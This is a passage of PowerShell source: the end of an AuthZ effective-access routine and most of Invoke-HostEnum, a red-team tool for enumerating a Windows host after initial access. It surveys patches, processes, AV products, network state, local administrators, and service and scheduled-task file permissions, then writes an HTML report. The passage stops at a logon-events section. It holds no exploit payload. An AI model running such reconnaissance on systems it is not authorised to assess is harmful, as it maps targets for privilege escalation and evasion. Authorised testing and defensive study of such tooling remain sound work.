                                    $Params.Name = '^{0}$' -f $_.ToString()
                                }

                                $Properties = Get-ADObjectAceGuid @Params

                                $CurrentGroupedProperties = $Properties | ForEach-Object -Begin { $Count = 0 } -Process {
                                    Write-Progress -Activity 'Building property list' -Status ('Current property: {0}' -f $_.Name) -PercentComplete (($Count++/$Properties.Count) * 100)
                                    New-Object -TypeName PSObject -Property @{
                                        Property = $_.Guid
                                        PropertySet = (LookupPropertySet -Property $_.Guid | Select-Object -ExpandProperty Value -ErrorAction SilentlyContinue)
                                    }
                                } -End { Write-Progress -Completed -Activity 'Building property list' -Status '' } | Group-Object -Property PropertySet

                                $__PropertyCountToCache = 1000
                                if ($Properties.Count -gt $__PropertyCountToCache) {
                                    Write-Verbose -Message ("{0}: Property count for ObjectAceType '{1}' is {2}; adding to cache" -f $MyInvocation.MyCommand, $_, $Properties.Count)
                                    $__GroupedPropertyCache.$_ = $CurrentGroupedProperties
                                }

                                $CurrentGroupedProperties
                            }
                        }
                    }

                    
                    
                    
                    
                    
                    $RequestedPropertiesPropertySets = $GroupedProperties | ForEach-Object {

                        
                        
                        if ($_.Name -eq '') {
                            
                            
                            $Level = 1
                        }
                        else {
                            
                            $ObjectTypeList.Level = 1
                            $ObjectType = ([guid] $_.Name).ToByteArray()
                            $Ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ObjectType.Count)
                            [Runtime.InteropServices.Marshal]::Copy($ObjectType, 0, $Ptr, $ObjectType.Count)
                            $ObjectTypeList.ObjectType = $Ptr
                            $ObjectTypeListArray += $ObjectTypeList

                            
                            $Level = 2

                            
                            
                            
                            $_.Name
                        }

                        $_.Group | Select-Object -ExpandProperty Property | ForEach-Object { 
                            $ObjectTypeList.Level = $Level
                            $ObjectType = ([guid] $_).ToByteArray()
                            $Ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ObjectType.Count)
                            [Runtime.InteropServices.Marshal]::Copy($ObjectType, 0, $Ptr, $ObjectType.Count)
                            $ObjectTypeList.ObjectType = $Ptr
                            $ObjectTypeListArray += $ObjectTypeList
                        }
                    }

                    
                    
                    
                    Write-Verbose -Message "$(Get-Date): Getting non-property object types"
                    $NonPropertyObjectAceTypes = $ObjectAceTypes | Where-Object { $_ } | ForEach-Object {
                        $Params = @{
                            TypesToSearch = 'ClassObject', 'ExtendedRight', 'ValidatedWrite', 'PropertySet'
                        }

                        if ($_ -is [PSObject] -and $_.Guid -is [guid]) {
                            $Params.Guid = $_.Guid
                        }
                        else {
                            $Guid = $_ -as [guid]
                            if ($Guid) {
                                $Params.Guid = $Guid
                            }
                            else {
                                $Params.Name = $_.ToString()
                            }
                        }

                        Get-ADObjectAceGuid @Params
                    }

                    
                    Write-Verbose -Message "$(Get-Date): Getting any property sets that weren't already found"
                    $RefObject = $NonPropertyObjectAceTypes | Where-Object { $_.Type -eq 'PropertySet' } | Select-Object -ExpandProperty Guid

                    
                    if (-not $RefObject) { $RefObject = @() }
                    if (-not $RequestedPropertiesPropertySets) { $RequestedPropertiesPropertySets = @() }
                    Write-Verbose -Message "$(Get-Date): Getting any property sets that weren't already found (using compare-object)"
                    Compare-Object -ReferenceObject $RefObject -DifferenceObject $RequestedPropertiesPropertySets |
                        Where-Object { $_.SideIndicator -eq '<=' } | ForEach-Object {
                                $ObjectTypeList.Level = 1
                                $ObjectType = ([guid] $_.InputObject).ToByteArray()
                                $Ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ObjectType.Count)
                                [Runtime.InteropServices.Marshal]::Copy($ObjectType, 0, $Ptr, $ObjectType.Count)
                                $ObjectTypeList.ObjectType = $Ptr
                                $ObjectTypeListArray += $ObjectTypeList
                        }

                    
                    Write-Verbose -Message "$(Get-Date): Getting non-property objects"
                    $NonPropertyObjectAceTypes | Where-Object { $_.Type -notmatch '^Property' } | ForEach-Object {
                        $ObjectTypeList.Level = 1
                        $ObjectType = ([guid] $_.Guid).ToByteArray()
                        $Ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ObjectType.Count)
                        [Runtime.InteropServices.Marshal]::Copy($ObjectType, 0, $Ptr, $ObjectType.Count)
                        $ObjectTypeList.ObjectType = $Ptr
                        $ObjectTypeListArray += $ObjectTypeList
                    }

                    
                    $SizeOfStruct = [Runtime.InteropServices.Marshal]::SizeOf([type][PowerShellAccessControl.PInvoke.authz+OBJECT_TYPE_LIST])
                    $ptrObjectTypeListArray = [Runtime.InteropServices.Marshal]::AllocHGlobal($SizeOfStruct * $ObjectTypeListArray.Count)
                    for ($i = 0; $i -lt $ObjectTypeListArray.Count; $i++) {
                        $ptrObjectTypeList = $ptrObjectTypeListArray.ToInt64() + ($SizeOfStruct * $i)
                        [Runtime.InteropServices.Marshal]::StructureToPtr($ObjectTypeListArray[$i], $ptrObjectTypeList, $false)
                    }

                    $Request.ObjectTypeList = $ptrObjectTypeListArray
                    $Request.ObjectTypeListLength = $ObjectTypeListArray.Count
                }
                

                
                
                
                $ResultListLength = $Request.ObjectTypeListLength
                if ($ResultListLength -eq 0) { $ResultListLength = 1 }

                $Reply = New-Object -TypeName PowerShellAccessControl.PInvoke.authz+AUTHZ_ACCESS_REPLY
                $Reply.ResultListLength = $ResultListLength
                $Reply.Error = [Runtime.InteropServices.Marshal]::AllocHGlobal($Reply.ResultListLength * [Runtime.InteropServices.Marshal]::SizeOf([type] [UInt32]))
                $Reply.GrantedAccessMask = [Runtime.InteropServices.Marshal]::AllocHGlobal($Reply.ResultListLength * [Runtime.InteropServices.Marshal]::SizeOf([type] [UInt32]))
                $Reply.SaclEvaluationResults = [IntPtr]::Zero 

                try {
                    
                    
                    
                    $hResourceManager = [IntPtr]::Zero
                    [PowerShellAccessControl.PInvoke.authz]::AuthzInitializeResourceManager(
                        [PowerShellAccessControl.PInvoke.AuthZEnums.AuthzResourceManagerFlags]::NoAudit, 
                        [IntPtr]::Zero,  
                        [IntPtr]::Zero,  
                        [IntPtr]::Zero,  
                        '',                     
                        [ref] $hResourceManager 
                    ) | CheckExitCode -ErrorAction Stop -Action 'Initializing resource manager'

                    
                    
                    $hClientContext = [IntPtr]::Zero
                    $UnusedId = New-Object -TypeName PowerShellAccessControl.PInvoke.authz+LUID
                    [PowerShellAccessControl.PInvoke.authz]::AuthzInitializeContextFromSid(
                        [PowerShellAccessControl.PInvoke.AuthZEnums.AuthzContextFlags]::None,  
                        $SidBytes,               
                        $hResourceManager,       
                        [IntPtr]::Zero,   
                        $UnusedId,               
                        [IntPtr]::Zero,   
                        [ref] $hClientContext    
                    ) | CheckExitCode -ErrorAction Stop -Action 'Initializing context from SID'

                    $SecurityDescriptorsToCheck.GetEnumerator() | ForEach-Object {
                        $CurrentSdEntry = $_

                        Write-Debug -Message 'Calling AuthzAccessCheck'
                        [PowerShellAccessControl.PInvoke.authz]::AuthzAccessCheck(
                            [PowerShellAccessControl.PInvoke.AuthZEnums.AuthzAccessCheckFlags]::None,  
                            $hClientContext,       
                            [ref] $Request, 
                            [IntPtr]::Zero, 
                            $CurrentSdEntry.Value, 
                            $null,                 
                            0,                     
                            [ref] $Reply,          
                            [ref] [IntPtr]::Zero  
                        ) | CheckExitCode -ErrorAction Stop -Action 'Performing access check'


                        $OutputProperties = @{
                            DisplayName = $CurrentSDObject.DisplayName
                            IdentityReference = $CurrentIdentityReference
                            
                        }

                        
                        
                        $SizeOfInt = [Runtime.InteropServices.Marshal]::SizeOf([type] [UInt32])
                        for ($i = 0; $i -lt $Reply.ResultListLength; $i++) {

                            
                            $GrantedMask = [Runtime.InteropServices.Marshal]::ReadInt32($Reply.GrantedAccessMask.ToInt64() + ($i * $SizeOfInt))
                            $ErrorCode = [Runtime.InteropServices.Marshal]::ReadInt32($Reply.Error.ToInt64() + ($i * $SizeOfInt))
                            $ErrorMessage = ([ComponentModel.Win32Exception] $ErrorCode).Message




                            
                            if ($ObjectTypeListArray -and ($i -gt 0)) {
                                $Guid = [Runtime.InteropServices.Marshal]::PtrToStructure($ObjectTypeListArray[$i].ObjectType, [type][guid])
                            }
                            else {
                                $Guid = [guid]::Empty
                            }

                            $OutputProperties = @{
                                Guid = $Guid
                                Permission = $GrantedMask
                                LimitedBy = $CurrentSdEntry.Name
                            }

                            New-Object -TypeName PSObject -Property $OutputProperties
                        }
                    } | Group-Object -Property Guid | ForEach-Object {
                        $Group = @($_.Group)

                        $OutputProperties = @{
                            DisplayName = $CurrentSDObject.DisplayName
                            IdentityReference = $CurrentIdentityReference
                        }

                        $GetPermissionParams = @{
                            AccessMaskEnumeration = $AccessMaskEnumeration
                        }

                        if (-not $ListAllRights) {
                            $TypeName = $__EffectiveAccessTypeName

                            $CombinedEffectiveAccess = [int]::MaxValue
                            foreach ($GroupItem in $Group) {
                                $CombinedEffectiveAccess = $CombinedEffectiveAccess -band $GroupItem.Permission
                            }
                            $GetPermissionParams.AccessMask = $CombinedEffectiveAccess
                            $GetPermissionParams.ObjectAceType = $Group[0].Guid
                            $OutputProperties.EffectiveAccess = GetPermissionString @GetPermissionParams

                            if ($OutputProperties.EffectiveAccess -eq 'None') {
                                return
                            }

                            $ReturnObject = New-Object -TypeName PSObject -Property $OutputProperties
                            $ReturnObject.pstypenames.Insert(0, $TypeName)
                            $ReturnObject
                        }
                        else {
                            $TypeName = $__EffectiveAccessListAllTypeName

                            $LimitedBy = @()
                            $AccessAllowed = $true
                            $GetPermissionParams.ObjectAceType = $Group[0].Guid
                            $GetPermissionParams.ListEffectivePermissionMode = $true
                            $Group | Where-Object { $_ } | ForEach-Object {
                                $GroupItem = $_

                                $GetPermissionParams.AccessMask = $GroupItem.Permission
                                GetPermissionString @GetPermissionParams | 
                                    Add-Member -MemberType NoteProperty -Name LimitedBy -Value $GroupItem.LimitedBy -PassThru |
                                    Add-Member -MemberType NoteProperty -Name AccessMask -Value $GroupItem.Permission -PassThru
                            } | Group-Object -Property Permission | ForEach-Object {
                                $Allowed = $true
                                $LimitedBy = @()
                                foreach ($PermissionGroup in $_.Group) {
                                    if (-not $PermissionGroup.Allowed) {
                                        $Allowed = $false
                                        $LimitedBy += $PermissionGroup.LimitedBy
                                    }
                                }

                                $OutputProperties.Allowed = $Allowed
                                $OutputProperties.Permission = $_.Name
                                $OutputProperties.LimitedBy = $LimitedBy -join ', '

                                $ReturnObject = New-Object -TypeName PSObject -Property $OutputProperties
                                $ReturnObject.pstypenames.Insert(0, $TypeName)
                                $ReturnObject

                            }
                        }

                    }

                }
                catch {
                    Write-Error -Message $_
                    continue
                }
                finally {
          Write-Verbose -Message 'Freeing effective access stuff'
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($Reply.Error)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($Reply.GrantedAccessMask)

                    $ObjectTypeListArray | Where-Object { $_ } | ForEach-Object {
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($_.ObjectType)
                    }

                    if ($Request.ObjectTypeList -ne [IntPtr]::Zero) {
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($Request.ObjectTypeList)
                    }

                    if ($hClientContext -ne [IntPtr]::Zero) {
                        [PowerShellAccessControl.PInvoke.authz]::AuthzFreeContext($hClientContext) | CheckExitCode -Action 'Freeing AuthZ client context'
                    }
                    if ($hResourceManager -ne [IntPtr]::Zero) {
                        [PowerShellAccessControl.PInvoke.authz]::AuthzFreeResourceManager($hResourceManager) | CheckExitCode -Action 'Freeing AuthZ resource manager'
                    }
                }
            }
        }
    }
}

function Invoke-HostEnum {
    <#
      .SYNOPSIS
    
        Performs local host and/or domain enumeration for situational awareness
    
        Author: Andrew Chiles (@andrewchiles) leveraging functions by @mattifestation, @harmj0y, @tifkin_, Joe Bialek, rvrsh3ll, Beau Bullock, and Tim Medin
        License: BSD 3-Clause
        Depenencies: None
        Requirements: None
        
        https://github.com/threatexpress/red-team-scripts
    
      .DESCRIPTION
    
        A compilation of multiple system enumeration / situational awareness techniques collected over time. 
    
        If system is a member of a domain, it can perform additional enumeration. However, the included domain enumeration is limited with the intention that PowerView, BoodHound, etc will be also be used.
        
        Report HTML file is written in the format of YYYYMMDD_HHMMSS_HOSTNAME.html in the current working directory.  
    
        Invoke-HostEnum is Powershell 2.0 compatible to ensure it functions on the widest variety of Windows targets
    
        Enumerated Information:
        
        - OS Details, Hostname, Uptime, Installdate
        - Installed Applications and Patches
        - Network Adapter Configuration, Network Shares, Listening Ports, Connections, Routing Table, DNS Cache, Firewall Status
        - Running Processes and Installed Services
        - Interesting Registry Entries
        - Local Users, Groups, Administrators 
        - Personal Security Product Status, AV Processes
        - Interesting file locations and keyword searches via file indexing
        - Interesting Windows Logs (User logins)
        - Basic Domain enumeration (users, groups, trusts, domain controllers, account policy, SPNs)
    
    
      .PARAMETER All
    
        Executes Local, Domain, and Privesc functions
        
      .PARAMETER Local
    
        Executes the local enumeration functions
    
      .PARAMETER Domain
    
        Executes the domain enumeration functions
        
      .PARAMETER Privesc
    
        Executes modified version of PowerUp privilege escalation enumeration (Invoke-AllChecks)
    
      .PARAMETER Quick
    
        Executes a brief initial survey that may be useful when initially accessing a host
        Only enumerates basic system info, processes, av, network adapters, firewall state, network connections, users, and groups
        Note: Not usable with -HTMLReport
        
      .PARAMETER HTMLReport
    
        Creates an HTML Report of enumeration results
    
      .PARAMETER Verbose
    
        Enables verbosity (Leverages Write-Verbose and output may differ depending on the console/agent you're using)
    
      .EXAMPLE
    
        PS C:\> Invoke-HostEnum -Local -HTMLReport -Verbose
    
        Performs local system enumeration with verbosity and writes output to a HTML report
    
      .EXAMPLE
    
        PS C:\> Invoke-HostEnum -Domain -HTMLReport
    
        Performs domain enumeration using net commands and saves the output to the current directory
    
      .EXAMPLE
    
        PS C:\> Invoke-HostEnum -Local -Domain 
    
        Performs local and domain enumeration functions and outputs the results to the console
    
      .LINK
    
      https://github.com/threatexpress/red-team-scripts
    
    #>
        [CmdletBinding()]
        Param(
            [Switch]$All,
            [Switch]$Local,
            [Switch]$Domain,
            [Switch]$Quick,
            [Switch]$Privesc,
            [Switch]$HTMLReport
        )
        
        # Ignore Errors and don't print to screen unless specified otherwise when calling Functions
        $ErrorActionPreference = "SilentlyContinue"
    
        # $All switch runs Local, Domain, and Privesc checks
        If ($All) {$Local = $True; $Domain = $True; $Privesc = $True}
        
        ### Begin Main Execution
        
        $Time = (Get-Date).ToUniversalTime()
        [string]$StartTime = $Time|Get-Date -uformat  %Y%m%d_%H%M%S
        
        # Create filename for HTMLReport
	If ($HTMLReport)
	{
		[string]$Hostname = $ENV:COMPUTERNAME
		[string]$FileName = $StartTime + '_' + $Hostname + '.html'
		If ($OutputPath -match "\\$")
		{
			$HTMLReportFile = $OutputPath + $FileName
		}
		elseif ($OutputPath)
		{
			$HTMLReportFile = (join-path $OutputPath $FileName)
		}
		else
		{
			$HTMLReportFile = (Join-Path $PWD $FileName)
		}
	
	
	# Header for HTML table formatting
            $HTMLReportHeader = @"
    <style>
    TABLE {border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}
    TH {border-width: 1px;padding: 3px;border-style: solid;border-color: black;background-color: #6495ED;}
    TD {border-width: 1px;padding: 3px;border-style: solid;border-color: black;font-family:courier;}
    TR:Nth-Child(Even) {Background-Color: #dddddd;}
    .odd  { background-color:#ffffff; }
    .even { background-color:#dddddd; }
    </style>
    <style>
    .aLine {
        border-top:1px solid #6495ED};
        height:1px;
        margin:16px 0;
        }
    </style>
    <title>System Report</title>
"@
    
        # Attempt to write out HTML report header and exit if there isn't sufficient permission
            Try {
                ConvertTo-HTML -Title "System Report" -Head $HTMLReportHeader `
                    -Body "<H1>System Enumeration Report for $($Env:ComputerName) - $($Env:UserName)</H1>`n<div class='aLine'></div>" `
                    | Out-File $HTMLReportFile -ErrorAction Stop
                }
            Catch {
                "`n[-] Error writing enumeration output to disk! Check your permissions on $PWD.`n$($Error[0])`n"; Return
            }
        }
        
        # Print initial execution status
        "[+] Invoke-HostEnum"
        "[+] STARTTIME:`t$StartTime"
        "[+] PID:`t$PID`n"
    
        # Check user context of Powershell.exe process and alert if running as SYSTEM
        $IsSystem = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
        
        If ($IsSystem) {
            "`n[*] Warning: Enumeration is running as SYSTEM and some enumeration techniques (Domain and User-context specific) may fail to yield desired results!`n"
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Note: Enumeration performed as 'SYSTEM' and report may contain incomplete results!</H2>" -as list | Out-File -Append $HTMLReportFile
            }
        }
        
        # Execute a quick system survey
        If ($Quick) {
            Write-Verbose "Performing quick enumeration..."
            "`n[+] Host Summary`n"
            $Results = Get-Sysinfo
            $Results | Format-List
            
            "`n[+] Running Processes`n"
            $Results = Get-ProcessInfo
            $Results | Format-Table ID, Name, Owner, Path -auto -wrap
            
            "`n[+] Installed AV Product`n"
            $Results = Get-AVInfo
            $Results | Format-List
    
            "`n[+] Potential AV Processes`n"
            $Results = Get-AVProcesses
            $Results | Format-Table -Auto
            
            "`n[+] Installed Software:`n"
            $Results  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
            if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -eq "64-bit")
            {
                $Results += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
            }
            $Results = $Results | Where-Object {$_.DisplayName} | Sort-Object DisplayName
            $Results | Format-Table -Auto -Wrap
            
            "`n[+] System Drives:`n"
            $Results = Get-PSDrive -psprovider filesystem | Select-Object Name, Root, Used, Free, Description, CurrentLocation
            $Results | Format-Table -auto
            
            "`n[+] Active TCP Connections:`n"
            $Results = Get-ActiveTCPConnections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, IPVersion
            $Results | Format-Table -auto
            
            "`n[+] Firewall Status:`n"
            $Results = Get-FirewallStatus
            $Results | Format-Table -auto
            
            "`n[+] Local Users:`n"
            $Results = Get-LocalUsers | Sort-Object SID -Descending | Select-Object Name, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, PasswordLastSet, LastLogin, Description
            $Results | Format-Table -auto -wrap
        
            "`n[+] Local Administrators:`n"
            $Results = Get-WmiObject -Class Win32_groupuser -Filter "GroupComponent=""Win32_Group.Domain='$env:COMPUTERNAME',Name='Administrators'""" |
            % {[wmi]$_.PartComponent} | Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description
            
            "`n[+] Local Groups:`n"
            $Results = Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Select-Object Name,SID,Description
            $Results | Format-Table -auto -wrap
    
            "`n[+] Group Membership for ($($env:username))`n"
            $Results = Get-UserGroupMembership | Sort-Object SID
            $Results | Format-Table -Auto
            
        }
        
        # Execute local system enumeration functions
        If ($Local) {
    
            # Execute local enumeration functions and format for report
            "`n[+] Host Summary`n"
            $Results = Get-Sysinfo
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Host Summary</H2>" -as list | Out-File -Append $HTMLReportFile
            }
            
            # Get Installed software, check for 64-bit applications
            "`n[+] Installed Software:`n"
            $Results  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
            if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -eq "64-bit")
            {
                $Results += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
            }
            
            $Results = $Results | Where-Object {$_.DisplayName} | Sort-Object DisplayName
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Software</H2>" | Out-File -Append $HTMLReportFile
            }
                
            # Get installed patches
            "`n[+] Installed Patches:`n"
            $Results = Get-WmiObject -class Win32_quickfixengineering | Select-Object HotFixID,Description,InstalledBy,InstalledOn | Sort-Object InstalledOn -Descending
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Patches</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Process Information
            "`n[+] Running Processes`n"
            $Results = Get-ProcessInfo
            $Results | Format-Table ID, Name, Owner, Path, CommandLine -auto 
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -Property ID, Name, Owner, MainWindowTitle, Path, CommandLine -PreContent "<H2>Process Information</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Services
            "`n[+] Installed Services:`n"
            $Results = Get-WmiObject win32_service | Select-Object Name, DisplayName, State, PathName
            $Results | Format-Table  -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Services</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Environment variables
            "`n[+] Environment Variables:`n"
            $Results = Get-Childitem -path env:* | Select-Object Name, Value | Sort-Object name
            $Results |Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Environment Variables</H2>"| Out-File -Append $HTMLReportFile
            }   
        
            # BIOS information
            "`n[+] BIOS Information:`n"
            $Results = Get-WmiObject -Class win32_bios |Select-Object SMBIOSBIOSVersion, Manufacturer, Name, SerialNumber, Version
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>BIOS Information</H2>" -as List| Out-File -Append $HTMLReportFile
            }
            
            # Physical Computer Information
            "`n[+] Computer Information:`n"
            $Results = Get-WmiObject -class Win32_ComputerSystem | Select-Object Domain, Manufacturer, Model, Name, PrimaryOwnerName, TotalPhysicalMemory, @{Label="Role";Expression={($_.Roles) -join ","}}
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Physical Computer Information</H2>" -as List | Out-File -Append $HTMLReportFile
            }
            
            # System Drives (Returns mapped drives too, but not their associated network path)
            "`n[+] System Drives:`n"
            $Results = Get-PSDrive -psprovider filesystem | Select-Object Name, Root, Used, Free, Description, CurrentLocation
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>System Drives</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Mapped Network Drives
            "`n[+] Mapped Network Drives:`n"
            $Results = Get-WmiObject -Class Win32_MappedLogicalDisk | Select-Object Name, Caption, VolumeName, FreeSpace, ProviderName, FileSystem
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Mapped Network Drives</H2>" | Out-File -Append $HTMLReportFile
            }
                
            ## Local Network Configuration
            
            # Network Adapters
            "`n[+] Network Adapters:`n"
            $Results = Get-WmiObject -class Win32_NetworkAdapterConfiguration | 
                Select-Object Description,@{Label="IPAddress";Expression={($_.IPAddress) -join ", "}},@{Label="IPSubnet";Expression={($_.IPSubnet) -join ", "}},@{Label="DefaultGateway";Expression={($_.DefaultIPGateway) -join ", "}},MACaddress,DHCPServer,DNSHostname | Sort-Object IPAddress -descending
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Adapters</H2>" | Out-File -Append $HTMLReportFile
            }
    
            # DNS Cache
            "`n[+] DNS Cache:`n"
            $Results = Get-WmiObject -query "Select * from MSFT_DNSClientCache" -Namespace "root\standardcimv2" | Select-Object Entry, Name, Data
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>DNS Cache</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Network Shares
            "`n[+] Network Shares:`n"
            $Results = Get-WmiObject -class Win32_Share | Select-Object  Name, Path, Description, Caption, Status
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Shares</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # TCP Network Connections
            "`n[+] Active TCP Connections:`n"
            $Results = Get-ActiveTCPConnections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, IPVersion
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Active TCP Connections</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # IP Listeners
            "`n[+] TCP/UDP Listeners:`n"
            $Results = Get-ActiveListeners |Where-Object {$_.ListeningPort -LT 50000}| Select-Object Protocol, LocalAddress, ListeningPort, IPVersion
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>TCP/UDP Listeners</H2>" | Out-File -Append $HTMLReportFile
            }
            # Firewall Status
            "`n[+] Firewall Status:`n"
            $Results = Get-FirewallStatus
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Firewall Status</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # WMI Routing Table
            "`n[+] Routing Table:`n"
            $Results = Get-WmiObject -class "Win32_IP4RouteTable" -namespace "root\CIMV2" |Select-Object Destination, Mask, Nexthop, InterfaceIndex, Metric1, Protocol, Type
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Routing Table</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # WMI Net Sessions
            "`n[+] Net Sessions:`n"
            $Results = Get-WmiObject win32_networkconnection | Select-Object LocalName, RemoteName, RemotePath, Name, Status, ConnectionState, Persistent, UserName, Description
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Sessions</H2>" | Out-File -Append $HTMLReportFile
            }

            # System File User Permissions
            "`n[+] System File Permissions Per Local User:`n"
            $Results = Get-SystemFilePermissions
                if ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>System File Permissions User</H2>" | Out-File -Append $HTMLReportFile
            }

            # Service File User Permissions
            "`n[+] Service File Permissions Per Local User:`n"
            $Results = Get-ServiceFilePermissions | Select-Object LocalUser, ServiceName, ServiceDisplayName, State, ServicePermissions, LogOnAccount, BinPathPermissions, BinPath
                if ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Service File Permissions User</H2>" | Out-File -Append $HTMLReportFile
            }

            # Scheduled Task File User Permissions
            "`n[+] Scheduled Task File Permissions Per Local User:`n"
            $Results = Get-ScheduledTaskFilePermissions | Select-Object LocalUser, TaskName, TaskPath, Author, Enabled, RunAsUser, RunLevel, RequiredPrivilege, CMDPermissions, CMDPath
                if ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Service Task File Permissions User</H2>" | Out-File -Append $HTMLReportFile
            }

            
            # Proxy Information
            "`n[+] Proxy Configuration:`n"
            $regkey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
            $Results = New-Object -TypeName PSObject -Property @{
                            Enabled = If ((Get-ItemProperty -Path $regkey).proxyEnable -eq 1) {"True"} else {"False"}
                            ProxyServer  = (Get-ItemProperty -Path $regkey).proxyServer
                            AutoConfigURL  = (Get-ItemProperty -Path $regkey).AutoConfigUrl
                            }
                            
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Proxy Configuration</H2>" | Out-File -Append $HTMLReportFile
            }
            
            ## Local User and Group Enumeration
            #######################
            
            # Local User Accounts
            "`n[+] Local users:`n"
            $Results = Get-LocalUsers | Sort-Object SID -Descending | Select-Object Name, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, PasswordLastSet, LastLogin, Description
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Users</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Local Administrators
            "`n[+] Local Administrators:`n"
            $Results = Get-WmiObject -Class Win32_groupuser -Filter "GroupComponent=""Win32_Group.Domain='$env:COMPUTERNAME',Name='Administrators'""" |
            % {[wmi]$_.PartComponent} | Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description
            
            $Results | Format-Table -auto -wrap
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Administrators</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Local Groups
            "`n[+] Local Groups:`n"
            $Results = Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Select-Object Name,SID,Description
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Groups</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Local Group Membership 
            "`n[+] Local Group Membership:`n"
            $Groups = Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Select-Object -expand Name
            
            Foreach ($Group in $Groups) {
                $results = $Null
                $Results = Get-WmiObject -Class Win32_groupuser -Filter "GroupComponent=""Win32_Group.Domain='$env:COMPUTERNAME',Name='$Group'""" | % {[wmi]$_.PartComponent} | Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description
                "[+] $Group - Members"
                $Results | Format-Table -auto
                If ($HTMLReport) {
                    $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Group Membership - $Group</H2>" | Out-File -Append $HTMLReportFile
                }
            }
    
            # Explicit Logon Events (Requires admin)
            "`n[+] Explicit Logon Events (4648) - Last 10 Days:`n"
